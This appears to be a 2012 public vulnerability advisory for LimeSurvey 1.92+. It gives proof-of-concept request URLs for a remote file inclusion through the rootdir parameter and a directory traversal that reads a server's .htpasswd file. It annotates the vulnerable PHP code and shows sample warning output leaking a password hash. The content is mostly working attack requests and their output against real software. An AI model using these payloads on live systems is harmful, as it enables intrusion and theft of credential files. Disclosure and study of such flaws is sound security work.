@@ -1,0 +1,90 @@
+  :::::::-.   ...    ::::::.    :::.
+   ;;,   `';, ;;     ;;;`;;;;,  `;;;
+   `[[     [[[['     [[[  [[[[[. '[[
+    $$,    $$$$      $$$  $$$ "Y$c$$
+    888_,o8P'88    .d888  888    Y88
+    MMMMP"`   "YmmMMMM""  MMM     YM
+	
+   [ Discovered by dun \ posdub[at]gmail.com ]
+   [ 2012-06-22                              ]
+ #################################################################
+ #  [ LimeSurvey 1.92+ build 120620 ]  Multiple Vulnerabilities  #
+ #################################################################
+ #
+ # Script: "LimeSurvey - the free and open source survey software tool"
+ #
+ # Vendor:   http://www.limesurvey.org/
+ # Download: http://download.limesurvey.org/Latest_stable_release/limesurvey192plus-build120620.zip
+ #
+ ################################################################
+ #
+ # [RFI] ( allow_url_include = On; register_globals = On; )
+ #
+ # Versions affected: 1.92+ build 120620
+ #
+ # Vuln: http://localhost/limesurvey/replacements.php?rootdir=http://localhost/phpinfo.txt?
+ 
+   File: ./limesurvey/replacements.php (line 3)
+   ...cut...
+   <?php
+   global $rootdir;
+   include_once($rootdir.'/classes/expressions/LimeExpressionManager.php');                     // [RFI]
+   ...cut...
+ 
+ ################################################################
+ #
+ # [Directory Traversal] ( display_errors On; register_globals = On; ) 
+ #
+ # Versions affected: 1.92+ build 120620 and previous
+ #
+ # Vuln: http://localhost/limesurvey/admin/importsurvey.php?copyfunction=1&sExtension=lss&sFullFilepath=../../secret/.htpasswd
+
+   File: ./limesurvey/admin/importsurvey.php (lines 18-38)
+   ...cut...
+   if ((!isset($importingfrom) && !isset($copyfunction)) || isset($_REQUEST['importingfrom']))   // 1 false if $copyfunction is set
+   {
+       die("Cannot run this script directly");
+   }
+   require_once('import_functions.php');                                                         // 2 include functions
+
+   if (!isset($copyfunction))
+   {
+       $sFullFilepath=$the_full_file_path;
+       $aPathInfo = pathinfo($sFullFilepath);
+       $sExtension = $aPathInfo['extension'];
+   }
+
+   $bImportFailed=false;  
+   if (isset($sExtension) && strtolower($sExtension)=='csv')
+   {
+       $aImportResults=CSVImportSurvey($sFullFilepath);
+   }
+   elseif (isset($sExtension) && strtolower($sExtension)=='lss')                                 // 3 true if $sExtension = 'lss'
+   {
+       $aImportResults=XMLImportSurvey($sFullFilepath,null,null, null,(isset($_POST['translinksfields']))); // 4 $sFullFilepath -> our file
+   ...cut...
+
+   File: ./limesurvey/admin/import_functions.php (lines 1080-1087)	
+   ...cut...
+   function XMLImportSurvey($sFullFilepath,$sXMLdata=NULL,$sNewSurveyName=NULL,$iDesiredSurveyId=NULL, $bTranslateInsertansTags=true)
+   {
+       global $connect, $dbprefix, $clang, $timeadjust;
+
+       $results['error']=false;
+       if ($sXMLdata == NULL)
+       {
+           $xml = simplexml_load_file($sFullFilepath);                                           // 5 try to open our file as xmlfile
+   ...cut...
+
+ This should return a warning with the first line of our file.
+ In this case: admin:$apr1$zq2Yh9mB$R9WIiMX4YwOnhDon1kvc5/ from .htpasswd :)
+ Something like this:
+	
+   Warning: simplexml_load_file() [function.simplexml-load-file]:
+   ../../secret/.htpasswd:1:parser error : Start tag expected, '<' not found in /www/limesurvey/admin/import_functions.php on line 1087
+   Warning: simplexml_load_file() [function.simplexml-load-file]:
+   admin:$apr1$zq2Yh9mB$R9WIiMX4YwOnhDon1kvc5/ in /www/limesurvey/admin/import_functions.php on line 1087
+   Warning: simplexml_load_file() [function.simplexml-load-file]:
+   ^ in /www/limesurvey/admin/import_functions.php on line 1087
+
+ ### [ dun / 2012 ] #####################################################
